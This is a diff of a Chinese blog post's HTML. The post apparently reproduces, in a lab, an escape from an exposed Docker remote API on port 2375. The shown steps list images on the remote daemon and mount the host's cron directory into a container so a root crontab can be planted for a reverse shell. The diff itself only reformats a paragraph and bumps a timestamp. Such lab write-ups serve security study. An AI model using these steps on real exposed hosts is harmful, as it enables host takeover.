@@ -20,7 +20,7 @@
 <meta property="og:image" content="https://liuliuliuzy.github.io/2021/02/07/docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/secure.png">
 <meta property="og:image" content="https://liuliuliuzy.github.io/2021/02/07/docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/shell.png">
 <meta property="article:published_time" content="2021-02-07T03:12:15.000Z">
-<meta property="article:modified_time" content="2021-02-07T09:43:05.981Z">
+<meta property="article:modified_time" content="2021-02-08T02:32:54.330Z">
 <meta property="article:author" content="zyLeo">
 <meta property="article:tag" content="Docker">
 <meta property="article:tag" content="Linux">
@@ -181,7 +181,9 @@
 <h3 id="查看效果"><a href="#查看效果" class="headerlink" title="查看效果"></a>查看效果</h3><p>在另一台虚拟机中查看docker宿主机的2375端口，可以看到相关信息。</p>
 <p><img src="remote-api.png" alt="remote-api"></p>
 <p><img src="外部访问.png" alt="外部访问"></p>
-<h2 id="步骤2、漏洞测试"><a href="#步骤2、漏洞测试" class="headerlink" title="步骤2、漏洞测试"></a>步骤2、漏洞测试</h2><h3 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h3><p>查看docker宿主机上已有的镜像<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(lzy㉿kaliForZy)-[~]</span><br><span class="line">└─$ docker -H tcp://192.168.170.129:2375 images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">alpine        latest    e50c909a8df2   9 days ago      5.61MB</span><br><span class="line">ubuntu        18.04     c090eaba6b94   2 weeks ago     63.3MB</span><br><span class="line">hello-world   latest    bf756fb1ae65   13 months ago   13.3kB</span><br></pre></td></tr></table></figure><br>然后创建容器。因为最后反弹shell的实现方式是使用crontab计划任务，所以需要将crontab用到的文件所在路径，也就是宿主机的<code>var/spool/cron</code>目录挂载到容器中。</p>
+<h2 id="步骤2、漏洞测试"><a href="#步骤2、漏洞测试" class="headerlink" title="步骤2、漏洞测试"></a>步骤2、漏洞测试</h2><h3 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h3><p>查看docker宿主机上已有的镜像</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(lzy㉿kaliForZy)-[~]</span><br><span class="line">└─$ docker -H tcp://192.168.170.129:2375 images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">alpine        latest    e50c909a8df2   9 days ago      5.61MB</span><br><span class="line">ubuntu        18.04     c090eaba6b94   2 weeks ago     63.3MB</span><br><span class="line">hello-world   latest    bf756fb1ae65   13 months ago   13.3kB</span><br></pre></td></tr></table></figure>
+<p>然后创建容器。因为最后反弹shell的实现方式是使用crontab计划任务，所以需要将crontab用到的文件所在路径，也就是宿主机的<code>var/spool/cron</code>目录挂载到容器中。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(lzy㉿kaliForZy)-[~]</span><br><span class="line">└─$ docker -H tcp://192.168.170.129:2375 run -it -v /var/spool/cron/:/get3cad/ c090 /bin/bash</span><br></pre></td></tr></table></figure>
 <p>ubuntu的crontab相关文件的路径为<code>var/spool/cron/crontabs/root</code>，但是我自己装的虚拟机在该路径下并不存在<code>root</code>文件。所以在尽进入到容器中后，要切换到相应路径（也可以在创建容器的时候就使用<code>chroot</code>参数），然后创建文件。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@22b103440b66:/get3cad/crontabs<span class="comment"># touch root</span></span><br></pre></td></tr></table></figure>
